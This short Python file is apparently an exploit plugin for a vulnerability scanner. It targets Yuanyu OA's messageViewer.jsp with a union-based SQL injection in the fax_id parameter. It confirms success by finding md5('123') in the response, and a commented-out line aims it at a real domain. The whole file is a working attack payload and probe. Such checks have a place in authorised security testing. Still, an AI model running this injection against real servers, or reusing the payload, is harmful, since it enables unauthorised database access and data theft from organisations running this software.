# coding:utf-8
# http://www.yuanyuoa.com
import requests

class Exploit:

    def attack(self, url):
        path = "/yyoa/ext/trafaxserver/ToSendFax/messageViewer.jsp?fax_id=-1'%20union%20all%20select%20NULL,md5(123),NULL,NULL%23"
        target = url+path

        response = requests.get(target)
        if response.status_code == 200 and '202cb962ac59075b964b07152d234b70' in response.text:
            return "{} has SQL Injection.".format(target)

# print Exploit().attack('http://www.yuanyuoa.com')